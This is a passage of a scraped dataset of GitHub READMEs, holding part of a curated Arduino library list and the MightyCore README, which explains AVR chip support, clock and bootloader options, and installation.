modules\nesp-link - esp8266 wifi-serial bridge, outbound tcp, and arduino/avr/lpc/nxp programmer\narduino-temperature-control-library - arduino library for maxim temperature integrated circuits\nrf24 - arduino driver for nrf24l01\nrf24 - optimized fork of nrf24l01 for arduino and raspberry pi\nrf24mesh - mesh networking for rf24network\ndue_can - object oriented canbus library for arduino due compatible boards\nfastled - easily & efficiently controlling a wide variety of led chipsets for arduino\niot-playground - esp8266 easyiot library and sensor examples\nespduino - esp8266 network client (mqtt, restful) for arduino\nesp_mqtt - mqtt client library for esp8266 soc\nesp_bridge - esp8266 firmware slip command, support mqtt, restful client\nultrasonic-hc-sr04 - ultrasonic hc-sr04 library for arduino\nmpu-9250 - arduino sketch for mpu-9250 9dof with ahrs sensor fusion\nmpu-6050 - basic mpu-6050 arduino sketch of sensor function\nmpu-9150 - arduino sketch for mpu-9150 9dof with ahrs sensor fusion\nlsm9ds0 - lsm9ds0 9dof sensor ahrs sketch\narduino-ds1302 - arduino library for the ds1302 real time clock chip\nxbee-arduino - arduino library for communicating with xbees in api mode\nenableinterrupt - new arduino interrupt library, designed for arduino uno/mega 2560/leonardo/due\nds3232rtc - arduino library for maxim integrated ds3232 and ds3231 real-time clocks\nds3231 - arduino library for ds3231 rtc\nrtclib - rtc library\narduino-ds1302 - arduino library for the ds1302 real time clock chip\nhx711 - an arduino library semiconductor hx711 adc for weight scales.\nminipirate - arduino serial command -----> tool !!! \nledcontrol - an arduino library for max7219 and max7221 led display drivers\narduino-bleperipheral - arduino library for creating custom ble peripherals with nordic semiconductor's nrf8001 or nr51822\nbtle - library for basic bluetooth low energy with the nrf24l01+\nbh1750 - an arduino library for the digital light sensor bh1750fvi\narduino-gp2y0a21yk-library - arduino library for the sharp gp2y0a21yk ir distance sensor\narduino-distance-sensor-library - arduino library for distance sensors\narduino-bleperipheral - library for creating custom ble peripherals with nordic semiconductor's nrf8001 or nr51822\narduino-temperature-control-library - arduino library for maxim temperature integrated circuits\nrgb-matrix-panel - arduino library and example code for the 16x32 rgb matrix panels\ntime - time library for arduino\nmodbusino - small modbus slave, rtu (serial) for arduino\nsimplemodbusng - modbus rtu slave/master for the arduino\nbootloader\nhoodloader2 - 16u2 bootloader to reprogram 16u2 + 328/2560 with arduino ide\noptiboot - small and fast bootloader for arduino and other atmel avr chips\nhardware independent library\narduino-irremote - infrared remote library for arduino: send and receive infrared signals ....\nirlib - an arduino library for encoding and decoding infrared remote signals\ni2cdevlib - i2c device library collection for avr/arduino or other c++-based mcus\nkeysweeper - keysweeper is a stealthy arduino-based device, camouflaged as a functioning usb ....\najson - an arduino library to enable json processing with arduino\narduinojson - c++ json library for iot. simple and efficient.\njson-streaming-parser - library for parsing potentially huge json streams on devices with scarce memory\nusb_host_shield_2.0 - revision 2.0 of usb host library for arduino\npubsubclient - a client library for the arduino ethernet shield that provides support for mqtt\nwiringpi - gordon's arduino wiring-like wiringpi library for the raspberry pi\narduino-pid-library - a pid library for arduino written in c++\nfirmata - firmata firmware for arduino\nuspeech - speech recognition toolkit for the arduino\ntalkie - speech library for arduino\nlow-power - low power library for arduino\narduinoobd - obd-ii library and sketches for arduino\nhiduino - native usb-midi on the arduino\nbrain - arduino library for reading neurosky eeg brainwave data\ncryptosuite - cryptographic suite for arduino (sha, hmac-sha)\ntimer - a fork of simon monk's arduino timer library\npjon - one wire multi master device communications bus system for arduino\nhid - enhanced hid functions for arduino\ncosa - an object-oriented platform for arduino programming\nndef - read and write ndef messages to nfc tags with arduino\nrosserial - ros client library for small, embedded devices, such as arduino\nsdfat - arduino fat16/fat32 library\narduino-communicator - very simple android application for communicating with arduino\narduino-pid-autotune-library -\ntinygps - a compact arduino nmea (gps) parsing library\narduino-eepromex - extended eeprom library for arduino\narduino-cmdmessenger - cmdmessenger communication library for arduino\narduino-libs-manchester - arduino manchester encoding\nshiftpwm - arduino library for software pwm with shift registers\narduino-easytransfer - an easy way to transfer data between arduinos\narduino-serialcommand - a wiring/arduino library to tokenize and parse commands received over a serial port.\ntmrpcm - arduino library for asynchronous playback of pcm/wav files direct from sd card\nmozzi - a sound synthesis library for arduino\nstandardcplusplus - standard c++ for arduino (port of uclibc++)\nardosc - open sound control(osc) library for arduino\nosc - arduino and teensy implementation of osc encoding\narduino-serial - example c and java host code to talking to an arduino or other \"serial\" device\nbounce2 - debouncing library for arduino or wiring\narduinothread - a simple way to run threads on arduino\nadaencoder - library for handling quadrature encoders for the arduino microcontroller\npinchangeint - pin change interrupt library for the arduino\narduino-rfid - arduino rfid reader with computer serial client\narcore - midi-usb support for arduino\narduino-base64 - a base64 library for the arduino platform, written in c\ndirectio - fast, simple i/o library for arduino\narduino-eventmanager - an event handling system for arduino\nonebutton - an arduino library for using a single button for multiple purpose input\njtag - jtag library for arduino\nsleep_n0m1 - a library that sets the arduino into sleep mode for a specified length of time\naeslib - arduino library for aes encryption\nmemoryfree - arduino memoryfree library\nsouliss - arduino based distributed networking framework for smart homes and iot\nled-matrix - single/bi/tri-color led matrix pwm driver for arduino\nonewire - library for dallas/maxim 1-wire chips\ntinyekf - lightweight c/c++ extended kalman filter with arduino example\narduino_midi_library - midi for arduino\nfreertos-arduino - freertos 8.2.3 arduino libraries\narduino_freertos_library - a freertos library for all arduino avr devices\nautomaton - reactive state machine framework for arduino\nlinkedlist - a fully implemented linkedlist made to work with arduino projects\nvirtualusbkeyboard - virtual an arduino as a hid device\nvirtual-shields-arduino - windows virtual shields for arduino library\n3d printer .\nrepetier-firmware - firmware for arduino based reprap 3d printer\n3d_printer - underverk's 3d printer\ngrbl - an open source, embedded, high performance g-code-parser and cnc milling controller run on a straight arduino\nnet library.\nwebduino - arduino webserver library\ntinywebserver - small web server for arduino, fits in 10kb rom, less than 512 bytes ram\nrestduino - a sketch to provide a rest-like interface to the arduino+ethernet shield\narest - a restful environment for arduino\narduinowebsocketclient - websocket client for arduino\narduinowebsocketserver - a websocket server running on an arduino\nesp8266 - esp8266 wifi library and sample code for arduino\narduino_uip - a plugin-replacement of the stock arduino ethernet library\nhttpclient - http client library for the spark core\narduino-restclient - arduino restful http request library\nsocket.io-arduino-client - a socket.io client for the arduino ethernet shield\narduino-ipv6stack - ipv6 stack for arduino and xbee based on contiki os network stack\nmqtt-sn-arduino - connecting mesh network to the mqtt broker and tunneling mqtt protocol over websocket\narduinoduepolarsslclient - sample arduino due sketch connecting to a polarssl server using psk authentication\narduino-mqtt - mqtt library for arduino based on the eclipse paho projects\nawot - arduino web server library\narduinowebsockets - websocket server and client for arduino\nhttpclient - arduino http library\naws-iot-device-sdk-arduino-yun - sdk for connecting to aws iot from an arduino y\u00fan.\nhttpclient - arduino http library\nmicrocoap - a small coap implementation for microcontrollers\ncommand line library\nplatformio - cross-platform code builder and the missing library manager ....\narduino-cmake - arduino cmake build system\nbitlash - a programmable command shell for arduino\narduino-shell - a command shell to interact with built-in arduino features\ndisplay library\narduino_lcd_menu - creates menu systems primarily useful for 16x2 or 16x4 lcd displays\nliquidmenu - menu creation library for hd44780 lcds (parallel and i2c), wraps liquidcrystal.\nliquidtwi2 - high speed i2c lcd library for arduino, which supports mcp23008 and mcp23017\nmenwiz - lcd menu library: short user code to manage complex menu structures\nu8glib - arduino monochrome graphics library for lcds and oleds\nucglib - arduino true color library for tfts and oleds\nbinding and api library\njohnny-five - javascript robotics and iot programming framework, based on arduino firmata protocol\npython-arduino-command-api - a python library for communicating with arduino microcontroller boards\nhidapi - a simple library for communicating with usb and bluetooth hid devices on linux, mac, and windows.\nblocklyduino - a web-based visual programming editor for arduino\nnoduino - javascript and node.js framework for controlling arduino with html and websockets\nino - command line toolkit for working with arduino hardware\nusb-serial-for-android - android usb host serial driver library for cdc, ftdi, arduino and other devices\nserial-port-json-server - a serial port json websocket server communicate with arduino\nphysicaloidlibrary - android library for communicating with physical-computing boards\nblynk-server - platform with ios and android apps to control arduino\nrad - ruby arduino development\nardublock - a block programming language for arduino\narduino-api - arduino library for real-time logging and streaming data to online plotly graphs\ndino - dino is a ruby gem that helps you bootstrap prototyping with an arduino\nduino - arduino framework for node.js\npyfirmata - python interface for the firmata protocol\njarduino - program your arduino in java\npython-arduino-command-api - a python library for communicating with arduino microcontroller boards\nhwio - go library for hardware i/o control, in the programming style of arduino\nrpc\nardurpc - rpc library for arduino and other microcontroller based boards\narduino-json-rpc - simple json-rpc server implementation for arduino\nmath library\narduino-signal-filtering-library - arduino library for signal filtering\ngaussian - gaussian filter for arduino\nhardwareboard\nhardware board for arduino diy.\nteensy - the teensy is a complete usb-based microcontroller development system\nblackmagic - in application debugger for arm cortex microcontrollers\nstm32plus - c++ library for the stm32 f0, f100, f103, f107 and f4\nide\narduino developments\narduino - official arduino ide\nesp8266 ide - arduino ide for esp8266\nstino - a sublime text plugin for arduino\nattiny - attiny microcontroller support for the arduino ide\narduinounit - a unit testing framework for arduino libraries\narduino-makefile - makefile for arduino sketches\narduino_sketches - publicly-released sketches for the arduino microprocessor\narduino-builder - a command line tool for compiling arduino sketches\narduinounit - a unit testing framework for arduino libraries\narduino-eclipse-plugin - a plugin to make programming the arduino in eclipse easy\ndueboot - rust on the arduino due\narduino-designer - graphic arduino designer based on eclipse\nxod - open source visual programming language and ide\ntutorials\ntutorials for arduino flash.\narduino-tutorial-series - these are the supporting materials for my popular series of tutorials on the arduino microcontroller platform\nesp8266 - various bits of code for esp8266\narduino_sketches - publicly-released sketches for the arduino microprocessor\nduezoo - some proof-of-concept sketches and results for arduino due\nprogramming_arduino - code for the book programming arduino: getting started with sketches\narduinoexamples - arduino blink chrome app\nprojects\nprojects with arduino\narduinoscope - an oscilloscope, using arduino and processing/node\narduinoplot - real time plot numeric values sent from arduino over serial port\narduinoisp - use the arduino to program avr chips\narduino-sms-alarm - an arduino based burglar alarm that sends an sms when motion is detected\nquadcopter_v2 - a quadcopter project based on raspberry pi and arduino\narduino time lapse panorama controller - the controller will rotate your gopro over a set angle for a set duration or will rotate your gopro for a full rotation for a set duration\nerbbie desktop garden - a diy desktop smart garden designed to give everyone a green thumb\nsmart garden - clone of erbbie\ntemperature controlled craft beer coolbox - a coolbox in which you can control the temperature in three separate compartments\nusage\nwork in 'git bash' at windows with git installed or linux os\nsh update.sh\nusage()\n{\necho \"\"\necho \" usage:\"\necho \"\"\necho \"./update.sh <cmd>\"\necho \" where <cmd> is one of:\"\necho \" --install-or-update (does full installation or update.)\"\necho \" --remove  (removes all installed)\"\necho \"\"\necho \"example:\"\necho ' $ ./update.sh --install-or-update'\n}\ncontributing\ncontributing\nyour contributions are always welcome!", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000097, "year": null}, {"Unnamed: 0": 2142, "autor": 102, "date": null, "content": "MightyCore\nAn Arduino core for ATmega8535, ATmega16, ATmega32, ATmega164, ATmega324, ATmega644 and ATmega1284, all running a Optiboot. Most Arduino UNO compatible libraries will work with this core. If not, it's fairly straight forward to port a library. This core requires at least Arduino IDE v1.6, where v1.8.7 or newer is recommended. If you're into \"generic\" AVR programming, I'm happy to tell you that all relevant keywords are being highlighted by the IDE through a separate keywords file. Make sure to test the example files (File > Examples > AVR C code examples).\nIf you're looking for a great development board for these DIP-40 microcontrollers, I got you covered! I've used the Arduino UNO for years, but felt like vital functionality was missing on the board. When designing this board I made sure all missing functionality was added. The board can be bought on my Tindie store.\nRead more in the hardware section below.\nTable of contents\nSupported microcontrollers\nSupported clock frequencies\nBootloader option\nBOD option\nEEPROM retain option\nLink time optimization / LTO\nPrintf support\nPin macros\nWrite to own flash\nPROGMEM with flash sizes greater than 64kiB\nPinout\nProgrammers\nHow to install\nBoards Manager Installation\nManual Installation\nATmega324PB\nPlatformIO\nGetting started with MightyCore\nWiring reference\nLibrary porting\nHardware\nMinimal setup\nSupported microcontrollers\nATmega1284\nATmega644\nATmega324\nATmega164\nATmega32\nATmega16\nATmega8535\n* All variants - P, PA, A, PB. Select the correct version in the 'Variant' menu\nCan't decide what microcontroller to choose? Have a look at the specification table below:\nmega1284 mega644 mega324 mega164 mega32 mega16 mega8535\nFlash 128kiB 64kiB 32kiB 16kiB 32kiB 16kiB 8kiB\nRAM 16kiB 4kiB 2kiB 1kiB 2kiB 1kiB 0.5kiB\nEEPROM 4kiB 2kiB 1kiB 0.5kiB 0.5kiB 0.5kiB 0.5kiB\nSerial ports 2 2 2/3* 2 1 1 1\nPWM pins 8 6 6/9* 6 4 4 4\nIO pins 32 32 32/39* 32 32 32 32\n* ATmega324PB has 3 serial ports, 9 PWM pins and 39 IO pins if internal oscillator is used.\nEEPROM option\nIf you want the EEPROM to be erased every time you burn the bootloader or upload using a programmer, you can turn off this option. You'll have to connect an ISP programmer and hit \"Burn bootloader\" to enable or disable EEPROM retain. Note that when uploading using a bootloader, the EEPROM will always be retained.\nSupported clock frequencies\nMightyCore supports a variety of different clock frequencies. Select the microcontroller in the boards menu, then select the clock frequency. You'll have to hit \"Burn bootloader\" in order to set the correct fuses and upload the correct bootloader. Make sure you connect an ISP programmer, and select the correct one in the \"Programmers\" menu. For time critical operations an external crystal/oscillator is recommended.\nYou might experience upload issues when using the internal oscillator. It's factory calibrated but may be a little \"off\" depending on the calibration, ambient temperature and operating voltage. If uploading failes while using the 8 MHz internal oscillator you have these options:\nEdit the baudrate line in the boards.txt file, and choose either 115200, 57600, 38400 or 19200 baud.\nUpload the code using a programmer (USBasp, USBtinyISP etc.) or skip the bootloader by holding down the shift key while clicking the \"Upload\" button\nUse the 4, 2 or 1 MHz option instead\nFrequency Oscillator type Speed Comment\n16 MHz External crystal/oscillator 115200 Default clock on most AVR based Arduino boards\n20 MHz External crystal/oscillator 115200\n18.4320 MHz External crystal/oscillator 115200 Great clock for UART communication with no error\n14.7456 MHz External crystal/oscillator 115200 Great clock for UART communication with no error\n12 MHz External crystal/oscillator 57600 Useful when working with USB 1.1 (12 Mbit/s)\n11.0592 MHz External crystal/oscillator 115200 Great clock for UART communication with no error\n8 MHz External crystal/oscillator 57600 Common clock when working with 3.3V\n7.3728 MHz External crystal/oscillator 115200 Great clock for UART communication with no error\n4 MHz External crystal/oscillator 9600\n3.6864 MHz External crystal/oscillator 115200 Great clock for UART communication with no error\n2 MHz External crystal/oscillator 9600\n1.8432 MHz External crystal/oscillator 115200 Great clock for UART communication with no error\n1 MHz External crystal/oscillator 9600\n8 MHz Internal oscillator 38400 Might cause UART upload issues. See comment above\n4 MHz Internal oscillator 9600 Derived from the 8 MHz internal oscillator\n2 MHz Internal oscillator 9600 Derived from the 8 MHz internal oscillator\n1 MHz Internal oscillator 9600 Derived from the 8 MHz internal oscillator\nBootloader option\nMightyCore lets you select which serial port you want to use for uploading. UART0 is the default port for all targets, but ATmega324/644/1284 can also use UART1 for upload. If your application doesn't need or require a bootloader for uploading you can also choose to disable it by selecting No bootloader. This frees 512 bytes of flash memory on ATmega8535/16/32/164/324 and 1024 bytes on ATmega644/1284.\nNote that you have need to connect a programmer and hit Burn bootloader if you want to change any of the Bootloader settings.\nBOD option\nBrown out detection, or BOD for short lets the microcontroller sense the input voltage and shut down if the voltage goes below the brown out setting. To change the BOD settings you'll have to connect an ISP programmer and hit \"Burn bootloader\". Below is a table that shows the available BOD options:\nATmega1284 Atmega644 ATmega324 ATmega164 ATmega32 ATmega16 ATmega8535\n4.3V 4.3V 4.3V 4.3V 4.0V 4.0V 4.0V\n2.7V 2.7V 2.7V 2.7V 2.7V 2.7V 2.7V\n1.8V 1.8V 1.8V 1.8V - - -\nDisabled Disabled Disabled Disabled Disabled Disabled Disabled\nLink time optimization / LTO\nLink time optimization (LTO for short) has been supported by the IDE since v1.6.11. The LTO optimizes the code at link time, making the code (often) significantly smaller without making it \"slower\". In Arduino IDE 1.6.11 and newer LTO is enabled by default. I've chosen to disable this by default to make sure the core keep backward compatibility. Enabling LTO in IDE 1.6.10 and older will return an error. I encourage you to try the new LTO option and see how much smaller your code gets! Note that you don't need to hit \"Burn Bootloader\" in order to enable LTO. Simply enable it in the \"Tools\" menu, and your code is ready for compilation. If you want to read more about LTO and GCC flags in general, head over to the GNU GCC website!\nPrintf support\nUnlike the official Arduino cores, MightyCore has printf support out of the box. If you're not familiar with printf you should probably read this first. It's added to the Print class and will work with all libraries that inherit Print. Printf is a standard C function that lets you format text much easier than using Arduino's built-in print and println. Note that this implementation of printf will NOT print floats or doubles. If you need printf to print floats, you'll have to use PlatformIO.\nIf you're using a serial port, simply use Serial.printf(F(\"Milliseconds since start: %ld\\n\"), millis());. As you can see, printf supports the F() macro, but you don't have to use it. Other libraries that inherit the Print class (and thus supports printf) are the LiquidCrystal LCD library and the U8G2 graphical LCD library.\nPin macros\nNote that you don't have to use the digital pin numbers to refer to the pins. You can also use some predefined macros that maps \"Arduino pins\" to the port and port number:\n// Use PIN_PB0 macro to refer to pin PB0 (Arduino pin 0 with the standard and sanguino pinout)\ndigitalWrite(PIN_PB0, HIGH);\n// Results in the exact same compiled code\ndigitalWrite(0, HIGH);\nWrite to own flash\nMightyCore uses Optiboot Flash, a bootloader that supports flash writing within the running application, thanks to the work of @majekw. This means that content from e.g. a sensor can be stored in the flash memory directly without the need of external memory. Flash memory is much faster than EEPROM, and can handle at least 10 000 write cycles before wear becomes an issue. For more information on how it works and how you can use this in you own application, check out the Serial_read_write for a simple proof-of-concept demo, and Flash_put_get + Flash_iterate for useful examples on how you can store strings, structs and variables to flash and retrieve then afterwards. The Read_write_without_buffer example demonstrate how you can read and write to the flash memory on a lower level without using a RAM buffer.\nPROGMEM with flash sizes greater than 64kiB\nThe usual PROGMEM attribute stores constant data such as string arrays to flash and is great if you want to preserve the precious RAM. However, PROGMEM will only store content in the lower section, from 0 and up to 64kiB. If you want to store data in the upper section, you can use PROGMEM1 (64 - 128kiB) if your target is an ATmega1284/P. Accessing this data is not as straight forward as with PROGMEM, but it's still doable:\nconst char far_away[] PROGMEM1 = \"Hello from far away!\\n\"; // (64 - 128kiB)\nvoid print_progmem()\n{\nchar c;\n// Print out far_away\nfor(uint8_t i = 0; i < sizeof(far_away); i++)\n{\nc = pgm_read_byte_far(pgm_get_far_address(far_away) + i);\nSerial.write(c);\n}\n}\nPinout\nThis core has three different pinout options:\nStandard: The default pinout, and is based on the original AVR pinout.\nBobuino: Basically an Arduino UNO pinout setting. This pinout version is great for using with shields or code that's written for the Arduino UNO, as the pin functions stay the same (MOSI on D11, MISO on D12, SCK on D13).\nSanguino: This pinout is common on older 3D printer controllers such as the Sanguino, RepRap Sanguinololu, and RepRap Gen7. This pinout is also known as \"avr_developers\".\nPlease have a look at the (pins_arduino.h) files for detailed info. Pick your favorite!\nClick to enlarge:\nMightyCore Standard pinout MightyCore Bobuino pinout MightyCore Sanguino pinout\nProgrammers\nMightyCore adds its own copies of all the standard programmers to the \"Programmer\" menu. You must select the MightyCore copy of the programmer you are using for \"Upload Using Programmer\" to work with ATmega1284, ATmega324A, ATmega324PB, or ATmega164A.\nHow to install\nBoards Manager Installation\nThis installation method requires Arduino IDE version 1.6.4 or greater.\nOpen the Arduino IDE.\nOpen the File > Preferences menu item.\nEnter the following URL in Additional Boards Manager URLs:\nhttps://mcudude.github.io/MightyCore/package_MCUdude_MightyCore_index.json\nSeparate the URLs using a comma ( , ) if you have more than one URL\nOpen the Tools > Board > Boards Manager... menu item.\nWait for the platform indexes to finish downloading.\nScroll down until you see the MightyCore entry and click on it.\nClick Install.\nAfter installation is complete close the Boards Manager window.\nManual Installation\nClick on the \"Download ZIP\" button. Extract the ZIP file, and move the extracted folder to the location \"~/Documents/Arduino/hardware\". Create the \"hardware\" folder if it doesn't exist. Open Arduino IDE, and a new category in the boards menu called \"MightyCore\" will show up.\nATmega324PB\nIf you plan to use the ATmega324PB you need the latest version of the Arduino toolchain. This toolchain is available through IDE 1.8.6 or newer. Here's how you install/enable the toolchain:\nOpen the Tools > Board > Boards Manager... menu item.\nWait for the platform indexes to finish downloading.\nThe top is named Arduino AVR boards. Click on this item.\nMake sure the latest version is installed and selected\nClose the Boards Manager window.\nPlatformIO\nPlatformIO is an open source ecosystem for IoT development and supports MightyCore.\nSee PlatformIO.md for more information.\nGetting started with MightyCore\nOk, so you've downloaded and installed MightyCore, but how do you get the wheels spinning? Here's a quick start guide:\nHook up your microcontroller as shown in the pinout diagram.\nIf you're not planning to use the bootloader (uploading code using a USB to serial adapter), the FTDI header and the 100 nF capacitor on the reset pin can be omitted.\nOpen the Tools > Board menu item, and select a MighyCore compatible microcontroller.\nIf the BOD option is presented, you can select at what voltage the microcontroller will shut down at. Read more about BOD here.\nSelect your prefered pinout. Personally I prefer the standard pinout because it's \"cleaner\", but the Bobuino pinout is better at Arduino UNO pin compatibility. Read more about the different pinouts here.\nSelect your prefered clock frequency. 16 MHz is standard on most Arduino boards.\nSelect what kind of programmer you're using under the Programmers menu.\nIf the Variants option is presented, you'll have to specify what version of the microcontroller you're using. E.g the ATmega1284 and the ATmega1284P have different device signatures, so selecting the wrong one will result in an error.\nHit Burn Bootloader. If an LED is connected to pin PB0, it should flash twice every second.\nNow that the correct fuse settings is set and the bootloader burnt, you can upload your code in two ways:\nDisconnect your programmer tool, and connect a USB to serial adapter to the microcontroller, like shown in the minimal setup circuit. Then select the correct serial port under the Tools menu, and click the Upload button. If you're getting some kind of timeout error, it means your RX and TX pins are swapped, or your auto reset circuity isn't working properly (the 100 nF capacitor on the reset line).\nKeep your programmer connected, and hold down the shift button while clicking Upload. This will erase the bootloader and upload your code using the programmer tool.\nYour code should now be running on your microcontroller! If you experience any issues related to bootloader burning or serial uploading, please use this forum post or create an issue on Github.\nWiring reference\nTo extend this core's functionality a bit futher, I've added a few missing Wiring functions. As many of you know Arduino is based on Wiring, but that doesn't mean the Wiring development isn't active. These functions are used as \"regular\" Arduino functions, and there's no need to include an external library.\nI hope you find this useful, because they really are!\nFunction list\nportMode()\nportRead()\nportWrite()\nsleepMode()\nsleep()\nnoSleep()\nenablePower()\ndisablePower()\nFor more information please view the Wiring reference page!\nLibrary porting\nSome users have reported issues when trying to use some 3rd party libraries with the ATmega8535, ATmega16 or ATmega32. A simple guide on how to port a library can be found here.\nHardware\nI've designed a development board for this particular core. I've added all the functionality I missed with the original Arduino boards, and added the original AVR pinout. Not all supported microcontrollers have the same pin functions, and differences are highlighted. The boards measures 8.0 * 10.0 cm (3.15 * 3.94 in)\nThe development board has some additional unique features:\nA voltage select jumper to run the microcontroller at 5V or 3.3V\nA breadboard friendly AVR with 32 IO pins, including 8 analog inputs\nAll pin located at the same side of the board, making it easy to hook it up to a breadboard\nMale and female IO pin headers\nPlenty of 5V, 3.3V and GND points broken out, both male and female\nA large ground pad on the underside of the board for connecting alligator clips, such as the ground clip of your oscilloscope\nA potentiometer for using as a voltage reference (e.g adjusting the LCD contrast)\nOnboard LED connected to digital pin 0 (PB0)\nA socketed crystal, perfect for experimenting with different clock frequencies\nAn auto reset enable header if you don't want the microcontroller to be reset every time you open the serial monitor on your PC\nPWM pins clearly marked and a lookup table that can be found on the under side of the board (three ~ - all microcontrollers, two ~ - 164; 324; 644; 1284, one ~ - 1284)\nIO peripherals written on the underside of the board. No need to search in the datasheet anymore!\nA Mini USB connector instead of a large USB Type-B plug\nAll serial hand shake pins broken out for applications such as bit banging (CTS, DTR, RI, DCD, DRT, RST)\nJTAG header for programming and debugging (the JTAG enable fuse must be sat first)\nThe development board can be bought on my Tindie store. This includes a pre programmed ATmega32 chip.\nClick the images for full resolution\nMinimal setup\nHere is a simple schematic showing a minimal setup using an external crystal. Skip the crystal and the two capacitors if you're using the internal oscillator.\nClick to enlarge:\nDIP-40 package TQFP-44 SMD package ATmega324PB SMD package", "link": "https://github.com/MCUdude/MightyCore", "origin": "Github", "suborigin": "arduino", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "mightycore\nan arduino core for atmega8535, atmega16, atmega32, atmega164, atmega324, atmega644 and atmega1284, all running a optiboot. most arduino uno compatible libraries will work with this core. if not, it's fairly straight forward to port a library. this core requires at least arduino ide v1.6, where v1.8.7 or newer is recommended. if you're into \"generic\" avr programming, i'm happy to tell you that all relevant keywords are being highlighted by the ide through a separate keywords file. make sure to test the example files (file > examples > avr c code examples).\nif you're looking for a great development board for these dip-40 microcontrollers, i got you covered! i've used the arduino uno for years, but felt like vital functionality was missing on the board. when designing this board i made sure all missing functionality was added. the board can be bought on my tindie store.\nread more in the hardware section below.\ntable of contents\nsupported microcontrollers\nsupported clock frequencies\nbootloader option\nbod option\neeprom retain option\nlink time optimization / lto\nprintf support\npin macros\nwrite to own flash\nprogmem with flash sizes greater than 64kib\npinout\nprogrammers\nhow to install\nboards manager installation\nmanual installation\natmega324pb\nplatformio\ngetting started with mightycore\nwiring reference\nlibrary porting\nhardware\nminimal setup\nsupported microcontrollers\natmega1284\natmega644\natmega324\natmega164\natmega32\natmega16\natmega8535\n* all variants - p, pa, a, pb. select the correct version in the 'variant' menu\ncan't decide what microcontroller to choose? have a look at the specification table below:\nmega1284 mega644 mega324 mega164 mega32 mega16 mega8535\nflash 128kib 64kib 32kib 16kib 32kib 16kib 8kib\nram 16kib 4kib 2kib 1kib 2kib 1kib 0.5kib\neeprom 4kib 2kib 1kib 0.5kib 0.5kib 0.5kib 0.5kib\nserial ports 2 2 2/3* 2 1 1 1\npwm pins 8 6 6/9* 6 4 4 4\nio pins 32 32 32/39* 32 32 32 32\n* atmega324pb has 3 serial ports, 9 pwm pins and 39 io pins if internal oscillator is used.\neeprom option\nif you want the eeprom to be erased every time you burn the bootloader or upload using a programmer, you can turn off this option. you'll have to connect an isp programmer and hit \"burn bootloader\" to enable or disable eeprom retain. note that when uploading using a bootloader, the eeprom will always be retained.\nsupported clock frequencies\nmightycore supports a variety of different clock frequencies. select the microcontroller in the boards menu, then select the clock frequency. you'll have to hit \"burn bootloader\" in order to set the correct fuses and upload the correct bootloader. make sure you connect an isp programmer, and select the correct one in the \"programmers\" menu. for time critical operations an external crystal/oscillator is recommended.\nyou might experience upload issues when using the internal oscillator. it's factory calibrated but may be a little \"off\" depending on the calibration, ambient temperature and operating voltage. if uploading failes while using the 8 mhz internal oscillator you have these options:\nedit the baudrate line in the boards.txt file, and choose either 115200, 57600, 38400 or 19200 baud.\nupload the code using a programmer (usbasp, usbtinyisp etc.) or skip the bootloader by holding down the shift key while clicking the \"upload\" button\nuse the 4, 2 or 1 mhz option instead\nfrequency oscillator type speed comment\n16 mhz external crystal/oscillator 115200 default clock on most avr based arduino boards\n20 mhz external crystal/oscillator 115200\n18.4320 mhz external crystal/oscillator 115200 great clock for uart communication with no error\n14.7456 mhz external crystal/oscillator 115200 great clock for uart communication with no error\n12 mhz external crystal/oscillator 57600 useful when working with usb 1.1 (12 mbit/s)\n11.0592 mhz external crystal/oscillator 115200 great clock for uart communication with no error\n8 mhz external crystal/oscillator 57600 common clock when working with 3.3v\n7.3728 mhz external crystal/oscillator 115200 great clock for uart communication with no error\n4 mhz external crystal/oscillator 9600\n3.6864 mhz external crystal/oscillator 115200 great clock for uart communication with no error\n2 mhz external crystal/oscillator 9600\n1.8432 mhz external crystal/oscillator 115200 great clock for uart communication with no error\n1 mhz external crystal/oscillator 9600\n8 mhz internal oscillator 38400 might cause uart upload issues. see comment above\n4 mhz internal oscillator 9600 derived from the 8 mhz internal oscillator\n2 mhz internal oscillator 9600 derived from the 8 mhz internal oscillator\n1 mhz internal oscillator 9600 derived from the 8 mhz internal oscillator\nbootloader option\nmightycore lets you select which serial port you want to use for uploading. uart0 is the default port for all targets, but atmega324/644/1284 can also use uart1 for upload. if your application doesn't need or require a bootloader for uploading you can also choose to disable it by selecting no bootloader. this frees 512 bytes of flash memory on atmega8535/16/32/164/324 and 1024 bytes on atmega644/1284.\nnote that you have need to connect a programmer and hit burn bootloader if you want to change any of the bootloader settings.\nbod option\nbrown out detection, or bod for short lets the microcontroller sense the input voltage and shut down if the voltage goes below the brown out setting. to change the bod settings you'll have to connect an isp programmer and hit \"burn bootloader\". below is a table that shows the available bod options:\natmega1284 atmega644 atmega324 atmega164 atmega32 atmega16 atmega8535\n4.3v 4.3v 4.3v 4.3v 4.0v 4.0v 4.0v\n2.7v 2.7v 2.7v 2.7v 2.7v 2.7v 2.7v\n1.8v 1.8v 1.8v 1.8v - - -\ndisabled disabled disabled disabled disabled disabled disabled\nlink time optimization / lto\nlink time optimization (lto for short) has been supported by the ide since v1.6.11. the lto optimizes the code at link time, making the code (often) significantly smaller without making it \"slower\". in arduino ide 1.6.11 and newer lto is enabled by default. i've chosen to disable this by default to make sure the core keep backward compatibility. enabling lto in ide 1.6.10 and older will return an error. i encourage you to try the new lto option and see how much smaller your code gets! note that you don't need to hit \"burn bootloader\" in order to enable lto. simply enable it in the \"tools\" menu, and your code is ready for compilation. if you want to read more about lto and gcc flags in general, head over to the gnu gcc website!\nprintf support\nunlike the official arduino cores, mightycore has printf support out of the box. if you're not familiar with printf you should probably read this first. it's added to the print class and will work with all libraries that inherit print. printf is a standard c function that lets you format text much easier than using arduino's built-in print and println. note that this implementation of printf will not print floats or doubles. if you need printf to print floats, you'll have to use platformio.\nif you're using a serial port, simply use serial.printf(f(\"milliseconds since start: %ld\\n\"), millis());. as you can see, printf supports the f() macro, but you don't have to use it. other libraries that inherit the print class (and thus supports printf) are the liquidcrystal lcd library and the u8g2 graphical lcd library.\npin macros\nnote that you don't have to use the digital pin numbers to refer to the pins. you can also use some predefined macros that maps \"arduino pins\" to the port and port number:\n// use pin_pb0 macro to refer to pin pb0 (arduino pin 0 with the standard and sanguino pinout)\ndigitalwrite(pin_pb0, high);\n// results in the exact same compiled code\ndigitalwrite(0, high);\nwrite to own flash\nmightycore uses optiboot flash, a bootloader that supports flash writing within the running application, thanks to the work of @majekw. this means that content from e.g. a sensor can be stored in the flash memory directly without the need of external memory. flash memory 